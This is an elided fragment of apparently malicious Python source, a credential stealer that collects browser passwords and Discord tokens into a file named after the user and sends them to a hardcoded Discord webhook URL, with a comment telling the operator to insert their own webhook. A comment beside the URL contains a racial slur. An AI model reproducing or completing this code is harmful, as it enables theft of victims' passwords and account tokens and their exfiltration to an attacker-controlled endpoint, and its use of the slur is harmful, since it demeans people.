...
filePass = "Passwords_" + os.getlogin() + ".txt"
...
def get_tokens(path):
    ...
    else:  # Old method, without encryption (outdated).
...
# Decrypt grabbed data from browsers
...
# Put here your WEBHOOK.
def post_to(file):
    webhook_url = "https://discord.com/api/webhooks/989159960036384834/cacXVM2JzYmuK1ZUuRdw8x8pGUCfL2QSQaiURmvdNb23nn_D0HTatJk4yEeoTzF8BnvN" # <--- "here nigga" 
